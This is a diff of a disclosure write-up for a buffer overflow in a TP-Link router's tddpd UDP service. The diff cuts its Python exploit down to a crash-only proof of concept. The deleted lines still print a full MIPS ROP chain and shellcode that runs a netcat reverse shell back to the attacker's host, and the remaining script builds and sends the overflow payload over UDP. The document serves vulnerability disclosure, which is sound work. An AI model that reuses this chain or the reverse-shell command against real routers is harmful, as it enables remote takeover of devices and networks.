@@ -16,7 +16,7 @@ This vulnerability happen when tddpd server receive data by usinng recvfrom `udp
 
 Refer to this video: [poc_video](./poc.mkv)
 
-**poc&exp**
+**poc**
 
 ```
 #!/usr/bin/env python
@@ -43,100 +43,8 @@ LOCAL_LISTEN_PORT=8080
 context.log_level='error'
 context.endian='big'
 context.arch='mips'
-data=b''.join([
-    p32(0xbeef0000),
-    p32(0xbeef0001),
-    p32(0xbeef0002),
-    p32(0x100), #s0
-    p32(0xbeef0004),
-    p32(0),
-    p32(0x4193c4), #s3
-    p32(0x4070e0), #rip
-    p32(0xbeef0008),# sp_1
-    p32(0xbeef0009),
-    p32(0xbeef000a),
-    p32(0xbeef000b),
-    p32(0xbeef000c),
-    p32(0xbeef000d),
-    p32(0xbeef000e),
-    p32(0x419800-4), # s0
-    p32(0),#s1
-    p32(0x402960), #ra_1
-    p32(0xbeef0012),# sp_2
-    p32(0xbeef0013),
-    p32(0xbeef0014),
-    p32(0xbeef0015),
-    p32(0xbeef0016),
-    p32(0xbeef0017),
-    p32(0xbeef0018),
-    p32(0xbeef0019),#shellcode1
-    p32(0x401790),
-    p32(0xbeef001b),
-    p32(0xbeef001c),#shellcode4
-    p32(0xbeef001d),
-    p32(0xbeef001e),
-    p32(0x300),#s0_2
-    p32(0xbeef0020),
-    p32(0x4070e0),#ra_2
-    p32(0xbeef0022),#sp_3
-    p32(0xbeef0023),
-    p32(0xbeef0024),
-    p32(0xbeef0025),
-    p32(0xbeef0026),
-    p32(0xbeef0027),
-    p32(0xbeef0028),
-    p32(0),#s0
-    p32(0x419810),#s1_2
-    p32(0x403e40),
-    p32(0xbeef002c),#sp
-    p32(0xbeef002d),
-    p32(0xbeef002e),
-    p32(0xbeef002f),
-    p32(0xbeef0030),
-    p32(0xbeef0031),
-    p32(0xbeef0032),
-    p32(0x420000),#s0
-    p32(0),#s1
-    p32(0x4194d0),#s2 :memcpy_got
-    p32(0x420000),#s3
-    p32(0x401cf8),#ra 
-    p32(0xbeef0038),#sp
-    p32(0xbeef0039),#sp
-    p32(0xbeef003a),#sp
-    p32(0xbeef003b),#sp
-    p32(0xbeef003c),#sp
-    p32(0xbeef003d),#sp
-    p32(0xbeef003e),#sp
-    p32(0x420000),#s0
-    p32(0),#s1
-    p32(0x419804-4),#s2
-    p32(0x420000),#s3
-    p32(0x403a78),#r0
-    p32(0xbeef0040),#sp
-    p32(0xbeef0040),#sp
-    p32(0xbeef0040),#sp
-    p32(0xbeef0040),#sp
-    p32(0xbeef0040),#sp
-    p32(0xbeef0040),#sp
-    p32(0x420000),#s0
-    p32(0x401cf8),#ra
-    p32(0xbeef0043),#sp
-    p32(0xbeef0043),#sp
-    p32(0xbeef0043),#sp
-    p32(0xbeef0043),#sp
-    p32(0xbeef0043),#sp
-    p32(0xbeef0043),#sp
-    p32(0xbeef0043),#sp
-    p32(0xbeef0044),#s0
-    p32(0xbeef0045),#s1
-    p32(0xbeef0046),#s2
-    p32(0xbeef0047),#s3
-    p32(0x419940),#ra
-])
 data+='\x00\x00\x00\x01'*16
-data+=p32(0xcafebabe)
-data+=asm(shellcraft.execve(path='/bin/sh',argv=['sh','-c','mknod /tmp/a p; nc %s %s 0</tmp/a | /bin/sh 1>/tmp/a 2>&1;'%(LOCAL_IP,LOCAL_LISTEN_PORT)]))
-
+data+=p32(0xcafebabe)*0x10000 # it can lead to buffer flowover
 len2=len(data)
 len1=4+len2
 hash=0x5a6b7c8d
@@ -152,18 +60,13 @@ info("hash 0x%x"%kk)
 payload=  b'\x01\x00'+p16(2)+p16(len1)+b'\x21\x00'
 payload+= p32(0xdeadbeef)+p32(kk)
 payload+= p16(1)+p16(len2)+data
-critical("We login to the management interface just for checking the version of firmware, the exploit itself requires nothing but the connection to the router's LAN.\n")
-log('Start connection to %s...'%REMOTE_IP)
 p=remote(REMOTE_IP,REMOTE_PORT,typ='udp')
 sleep(1)
-sys.stdout.write('Connect success\n')
-log('Start exploiting')
 for i in range(10):
     sys.stdout.write('.')
     sleep(1)
 print ''
 p.send(payload)
-log('Exploit success! Try connect router with telnet %s at port 1234\n'%REMOTE_IP)
 
 ```
 
@@ -172,3 +75,5 @@ log('Exploit success! Try connect router with telnet %s at port 1234\n'%REMOTE_I
 2020.10.24 show in GeekPwn
 
 2020.12.01 report to CVE and TP-Link
+
+2020.12.12 TP-Link reply and fix it
